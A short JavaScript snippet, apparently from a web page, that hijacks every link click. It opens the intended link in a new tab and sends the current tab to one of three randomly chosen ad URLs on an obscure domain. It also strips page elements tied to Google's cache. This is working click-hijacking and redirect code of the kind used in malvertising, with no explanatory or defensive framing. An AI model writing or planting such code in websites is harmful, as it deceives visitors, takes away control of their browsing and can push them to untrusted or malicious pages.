var go_ads1 =
    "https://edua29146y.com/jyix0tpf?key=115df0ced165ea89b704175aa0894f99";
  var go_ads2 =
    "https://edua29146y.com/yv5mvjqe?key=112b9967e009ed595d84ed4ea1873e89";
  var go_ads3 =
    "https://edua29146y.com/c3rybbq7?key=376c24f712ec26e9b89ffdf60fce38b9";

  var go_ads = rChoice([go_ads1, go_ads2, go_ads3]);

  function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
  }

  $(document).ready(function () {
    $("[id*='google-cache']").remove();
  });

  $(document).on("click", "a", function (e) {
    e.preventDefault();

    var target = $(this).attr("href");

    window.open(target, "_blank");
    window.location.href = go_ads;
  });
